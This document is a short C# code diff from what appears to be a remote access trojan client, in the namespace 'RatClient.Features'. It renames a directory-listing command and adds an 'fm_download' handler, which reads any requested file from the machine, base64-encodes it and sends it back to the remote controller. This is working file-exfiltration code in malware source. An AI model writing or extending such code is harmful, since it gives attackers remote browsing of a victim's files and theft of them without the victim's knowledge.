@@ -23,12 +23,22 @@ namespace RatClient.Features
         #region Methods
         private void HandleMessage(dynamic jsonMessage)
         {
-            if (jsonMessage["type"] == "read_directory")
+            if (jsonMessage["type"] == "fm_list")
             {
                 string filesAndFolders = GetFilesAndFolders(jsonMessage["path"]);
                 if (!string.IsNullOrEmpty(filesAndFolders))
                 {
-                    sendJson(new { type = "files_and_folders", filesAndFolders });
+                    sendJson(new { type = "fm_list", filesAndFolders });
+                }
+            }
+            else if (jsonMessage["type"] == "fm_download")
+            {
+                string filePath = jsonMessage["path"];
+
+                if (File.Exists(filePath))
+                {
+                    string data = Convert.ToBase64String(File.ReadAllBytes(filePath));
+                    sendJson(new { type = "fm_upload", name = Path.GetFileName(filePath), data });
                 }
             }
         }
